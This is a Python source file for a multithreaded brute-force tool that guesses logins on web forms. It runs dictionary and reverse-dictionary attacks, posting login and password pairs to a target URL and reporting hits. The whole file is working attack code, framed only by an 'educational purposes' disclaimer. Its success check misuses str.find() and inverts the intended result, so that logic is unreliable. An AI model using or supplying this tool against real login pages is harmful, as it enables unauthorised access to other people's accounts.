## ============================================================================== ##
##                                                                                ##
## Author : Eliseev Vlad 							  ##
## Contact link : https://github.com/shmel3 					  ##
## License : All entire code is published under a GNU GPLv3 license               ##
##								                  ##
## =============================== Notes from author ============================ ##
##									          ##
## This program was written in educational purposes.				  ##
## Please, never use it with malicious intent.				          ##
## You are free to use any of this code in your program, but I would be grateful  ##
## if you leave my contact links in it.                                           ##
##                                                                                ##
## ============================================================================== ##

import threading
from queue import Queue
import requests

### PRINT LOCK ###
print_lock = threading.Lock()
### END PRINT LOCK ###

def make_request(pattern, login, password):
	pattern.request_body[pattern.login_var] = login
	pattern.request_body[pattern.pass_var] = password
	response = requests.request(pattern.http_method, 
				pattern.url, 
				data = pattern.request_body,
				cookies = pattern.cookies
				)
	return response


def parse_response(response, unsuccess_sign):
	"""
	 unsuccess_sign is string that is stored in html code of page
	 if auth request was unsuccessful.
	 e.g. "Failed login attemp.", "Error. Try again.", etc.
	"""
	if response.text.find(unsuccess_sign):
		return 'UNSUCCESS'
	else:
		return '[!] SUCCESS [!]'

	

def dict_attack(request_pattern, queue, password_list):
	"""	
	 Dictionary attack of target url based on
	 default brute force (try all password for every login)
	 e.g. login:pass1, login:pass2, login:pass3, etc.
	"""
	while True:
		login = queue.get()
		for passwd in password_list:
			response = make_request(request_pattern, login, passwd)
			with print_lock:
				print('Trying ' 
				     + login 
				     + ' : '
				     + passwd
				     , end = ' '
				     )
				result = parse_response(response, request_pattern.unsuccess_sign)
				print(result)
		queue.task_done()
	

def reverse_dict_attack(request_pattern, login_list, queue):
	"""
	 Reverse dict attack is based on reverse technique:
	 try all logins for each password
	 e.g. login1:pass, login2:pass, login3:pass, etc.
	"""
	while True:
		passwd = queue.get()
		for login in login_list:
			response = make_request(request_pattern, login, passwd)
			with print_lock:
				print('Trying ' 
				     + login 
				     + ' : '
				     + passwd
				     , end = ' '
				     )
				result = parse_response(response, request_pattern.unsuccess_sign)
				print(result)
		queue.task_done()


def brute_force(request_pattern, logins, passwords, num_threads, reverse = False):		
	q = Queue()
	if reverse == False:
		for thread_counter in range(num_threads):
			thrd = threading.Thread(target = dict_attack, args = (request_pattern, q, passwords))
			thrd.daemon = True
			thrd.start()

		for login in logins:
			q.put(login)
	else:
		for thread_counter in range(num_threads):
			thrd = threading.Thread(target = reverse_dict_attack, args = (request_pattern, logins, q))			
			thrd.daemon = True
			thrd.start()

		for passwd in passwords:
			q.put(passwd)
	q.join()
